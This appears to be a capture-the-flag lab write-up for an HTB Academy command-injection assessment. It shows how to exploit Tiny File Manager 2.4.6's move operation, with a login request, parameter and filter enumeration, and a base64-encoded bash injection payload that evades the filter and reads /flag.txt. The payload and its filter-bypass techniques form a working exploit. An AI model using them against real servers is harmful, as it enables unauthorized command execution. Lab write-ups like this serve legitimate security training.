# HTB Academy — CWES Command Injection Skills Assessment

**Target:** `154.57.164.80:31504`  
**App:** Tiny File Manager v2.4.6  
**Credentials:** guest / guest  
**Goal:** Read `/flag.txt`

---

## Attack Chain

### 1. Recon

Login redirects to `index.php?to=`. App lists files hosted in `/var/www/html/files`.

```bash
curl -v -c /tmp/fm.txt -X POST 'http://TARGET/?to=' -d "fm_usr=guest&fm_pwd=guest"
# → 302 redirect, sets cookie: filemanager=<session>
```

Files in root: 10 `.txt` files (31 bytes each). Subfolder: `tmp/`.

### 2. Identify Parameters

| Parameter | Location | Purpose |
|-----------|----------|---------|
| `to` | GET | Directory navigation / move destination |
| `from` | GET | Move/copy source file |
| `finish` | GET | Confirm move/copy |
| `move` | GET | Flag: move vs copy |
| `view` | GET | View file content |
| `dl` | GET | Download file |

### 3. Find the Injection Point

The **move operation** uses all four parameters together:
```
GET /index.php?to=DEST&from=SOURCE&finish=1&move=1
```

TFM passes `to=` to a shell command. This is the injection point.

**Critical:** All four parameters (`to`, `from`, `finish`, `move`) must be present. Requests missing any of them do not trigger the shell command.

### 4. Enumerate the Filter

Testing `to=tmp%0awhoami` → `Malicious request denied!`  
`%0a` (newline) is detected and blocked.

Testing `to=tmp%26whoami` → error about mv (command ran, `whoami` is filtered)  
`%26` (`&`) is **NOT** blocked as an operator.

The filter has two layers:
- Blocks `%0a` operator (newline)  
- Blocks common command names (`whoami`, `cat`, etc.) directly
- Does NOT block `%26` operator

### 5. Bypass the Command Filter — Base64 Nuclear Option

Since commands are blacklisted by name, encode the entire command in base64. The filter cannot inspect inside the encoded payload.

```bash
# Encode the command locally
echo -n 'cat /flag.txt' | base64
# → Y2F0IC9mbGFnLnR4dA==

# With trailing newline (ensures clean shell termination)
echo 'cat /flag.txt' | base64
# → Y2F0IC9mbGFnLnR4dAo=
```

Space bypass: use `%09` (tab) between `base64` and `-d`. `${IFS}` may itself be filtered.

Injection payload:
```
%26bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dAo=)
```

### 6. Final Request

```
GET /index.php?to=tmp%26bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dAo=)&from=2470930823.txt&finish=1&move=1 HTTP/1.1
Host: 154.57.164.80:31504
Cookie: filemanager=<session>
```

Flag content appears in the HTML response body.

---

## Key Lessons

### What the filter blocks
- `%0a` (newline) as injection operator — "Malicious request denied!"
- Common command names directly: `whoami`, `cat`, `ls`, `id`

### What bypasses the filter
- `%26` (`&`) as injection operator — not in the blacklist
- Base64 encoding the entire command — filter cannot inspect encoded payload
- `%09` (tab) as space inside the base64 invocation

### Operator enumeration is mandatory
`%0a` is not always the right operator. Always test ALL operators in isolation on the confirmed injection point before assuming newline is correct:
- `%0a` → blocked here
- `%26` → worked here
- `%3b` → not tested
- `%7c` → not tested

### Complete request structure required
For TFM move operation, ALL four parameters must be present or the shell command is never invoked. Partial requests (`to=` alone, or without `finish=1&move=1`) return HTML without executing anything.

### Track target state during testing
Move/copy operations change which files exist in which directories. Using a `from=` file that has already been moved causes the operation to fail silently. Always check the current file listing before constructing requests.

### Base64 payload: include trailing newline
`Y2F0IC9mbGFnLnR4dAo=` (from `echo 'cat /flag.txt' | base64`) includes a trailing newline, which ensures the decoded command terminates cleanly in the shell.  
`Y2F0IC9mbGFnLnR4dA==` (from `echo -n`) lacks this and may cause silent failures in some contexts.

### Finding output in the response
Do not grep for assumed flag formats like `HTB{...}` — the flag might not match. Use diff against a clean baseline to isolate exactly what the command output added to the response.

```bash
curl -s -b /tmp/fm.txt 'http://TARGET/index.php?to=tmp' > /tmp/base.html
curl -s -b /tmp/fm.txt 'http://TARGET/index.php?to=tmp%26PAYLOAD&from=FILE&finish=1&move=1' > /tmp/inj.html
diff /tmp/base.html /tmp/inj.html
```
